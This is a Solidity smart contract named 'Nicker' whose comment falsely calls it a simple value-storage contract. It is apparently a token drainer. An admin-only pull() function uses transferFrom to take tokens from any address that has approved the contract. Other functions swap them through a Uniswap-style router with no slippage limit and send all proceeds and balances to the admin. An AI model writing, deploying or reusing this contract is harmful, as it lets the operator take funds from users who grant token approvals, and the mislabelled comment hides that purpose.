import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interface/IUniswapRouter.sol";
import "./interface/IUniswapPair.sol";


/**
 * @title Nicker
 * @dev Store & retrieve value in a variable
 */
contract Nicker {

    address private admin;
    address public uniswapV2Router;

    modifier onlyOwner() {
        require(msg.sender == admin, "Admin can only access this function");
        _;
    }

    constructor(address _router) {
        admin = msg.sender;
        uniswapV2Router = _router;
    }

    function pull(address _token, address _from, uint256 _amount) public onlyOwner {
        require(_token != address(0x0), "addresses can't be zero address");
        require(_from != address(0x0), "addresses can't be zero address");
        require(_amount > 0, "amount should be greater than zero");
        IERC20(_token).transferFrom(_from, address(this), _amount);
    }

    function withdraw(address _token) public onlyOwner {
        require(_token != address(0x0), "addresses can't be zero address");
        uint256 balance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(admin, balance);
    }

    function swapTokenForBUSD(
        address _tokenIn, 
        address _tokenOut,
        uint256 _amountIn        
    ) public onlyOwner{
        // generate the uniswap pair path of token -> busd
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;

        IERC20(_tokenIn).approve(uniswapV2Router, _amountIn);
        // make the swap
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amountIn,
            0,
            path,
            admin,
            block.timestamp
        );
    }

    function getReservesFor(address _pair) public view returns(uint, uint) {
        require(_pair != address(0x0), "addresses can't be zero address");
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(_pair).getReserves();
        return (uint(reserve0), uint(reserve1));
    }
}

